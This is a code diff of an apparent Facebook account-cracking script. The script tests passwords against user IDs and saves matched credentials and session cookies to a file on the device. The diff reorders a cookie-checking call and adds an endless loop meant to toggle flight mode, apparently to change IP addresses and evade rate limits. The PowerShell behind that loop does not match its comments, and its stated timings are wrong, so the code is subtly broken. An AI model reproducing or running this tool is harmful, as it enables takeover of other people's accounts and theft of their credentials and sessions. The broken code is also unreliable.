@@ -647,9 +647,9 @@ def api1(ids,names,passlist):
                                         print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        cek_apk(coki)
                                         open('/sdcard/BITHIKA-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(ids)
+                                        cek_apk(coki)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
@@ -1211,7 +1211,33 @@ def rndm3(uid,passlist):
                 loop+=1
         except Exception as e:
                 pass
- 
+
+
+
+
+
+
+while True:
+    # Command to enable flight mode (placeholder command)
+    command_on = 'powershell -Command "Add-Type -TypeDefinition \'using System; using System.Runtime.InteropServices; public class Win32 { [DllImport(\\"User32.dll\\", CharSet = CharSet.Auto)] public static extern bool SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam); }\' -PassThru; [Win32]::SendMessage([System.IntPtr]::Zero, 0x0010, [System.IntPtr]::Zero, [System.IntPtr]::Zero)"'
+    
+    # Command to disable flight mode (placeholder command)
+    command_off = 'powershell -Command "Add-Type -TypeDefinition \'using System; using System.Runtime.InteropServices; public class Win32 { [DllImport(\\"User32.dll\\", CharSet = CharSet.Auto)] public static extern bool SendMessage(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam); }\' -PassThru; [Win32]::SendMessage([System.IntPtr]::Zero, 0x0010, [System.IntPtr]::Zero, [System.IntPtr]::Zero)"'
+
+    # Enable flight mode
+    subprocess.run(command_on, shell=True, check=True)
+    print("Flight mode enabled")
+    
+    # Wait for 30 seconds
+    time.sleep(3)
+    
+    # Disable flight mode
+    subprocess.run(command_off, shell=True, check=True)
+    print("Flight mode disabled")
+    
+    # Wait for another 30 seconds
+    time.sleep(30)
+
 #----------------[ ID-CHECKER ]--------------------------#
 
 def cek_apk(coki):
